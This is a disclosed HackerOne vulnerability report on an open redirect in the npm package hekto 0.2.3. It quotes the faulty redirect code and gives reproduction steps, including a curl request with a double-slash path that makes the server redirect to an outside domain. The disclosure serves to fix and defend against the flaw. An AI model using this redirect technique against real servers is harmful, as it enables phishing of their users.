# [hekto] open redirect when target domain name is used as html filename on server

## Report Details
- **Report ID**: 320693
- **URL**: https://hackerone.com/reports/320693
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-02-28T08:25:04.122Z
- **Disclosed**: 2018-05-20T08:45:37.538Z

## Reporter
- **Username**: brainpanic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi,

There is an open redirect in hekto when target domain name is used as html filename on server.

# Module

**module name:** hekto
**version:** 0.2.3
**npm page:** `https://www.npmjs.com/package/hekto`

## Module Description

This package exposes a directory and its children to create, read, update, and delete operations over http.

## Module Stats

[0] downloads in the last day
[21] downloads in the last week
[216] downloads in the last month

~[2600] estimated downloads per year

# Vulnerability

## Vulnerability Description

When processing extensionless html, hekto launches a redirection.

```
//https://github.com/herber/hekto/blob/master/bin/hekto.js#L184
      // Add trailing slash for extensionless html.
      if (fs.existsSync(file + '.html') && fs.lstatSync(file + '.html').isFile()) {
        this.status = 307;
        this.redirect(this.request.url + '/' + query);

        return ;
      }
```

For example, if there is a file named "hackerone.com.html" in document root dir, accessing `http://<server>/hackerone.com` will leads to a redirection to `http://<server>/hackerone.com/`.

But when accessing `http://<server>//hackerone.com`, the server would redirect ro `//hackerone.com`.


## Steps To Reproduce:

1. install hekto module
`$ npm install hekto`

2. create a file named `hackerone.com.html`
`$ touch hackerone.com.html`

3. run server from command line
`$ ./node_modules/hekto/bin/hekto.js serve`

4. test redirection

```
$ curl -i http://127.0.0.1:3000//hackerone.com
HTTP/1.1 307 Temporary Redirect
Vary: Accept-Encoding
X-Powered-By: Hekto
Location: //hackerone.com/
Content-Type: text/html; charset=utf-8
Content-Length: 63
Date: Wed, 28 Feb 2018 08:22:31 GMT
Connection: keep-alive

Redirecting to <a href="//hackerone.com/">//hackerone.com/</a>.
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- macOS 10.13.3
- Node.js v9.6.1
- npm 5.6.0
- curl 7.54.0

# Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This vulnerability can be used to phishing attacks

## Attachments
No attachments
